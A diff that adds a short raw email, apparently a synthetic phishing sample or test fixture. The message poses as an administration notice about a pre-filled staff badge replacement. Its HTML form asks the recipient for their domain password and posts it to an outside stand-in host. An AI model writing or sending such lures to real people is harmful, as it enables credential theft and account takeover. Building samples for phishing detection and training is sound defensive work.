@@ -1,0 +1,10 @@
+From: =?utf-8?B?6KGM5pS/?= <admin@corp-relay3.example>
+To: wei.hua@corp.internal
+Date: Mon, 07 Sep 2026 09:25:00 +0800
+Message-ID: <0015-b15@synth.example>
+Subject: 工牌补办申请（已预填）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p>补办信息已预填，确认提交：</p><form action='https://badge-confirm3.example.org/s'><input name='emp' value='wei.hua@corp.internal' readonly> <input name='pwd' type='password' placeholder='域密码确认身份'> <button>提交</button></form></body></html>
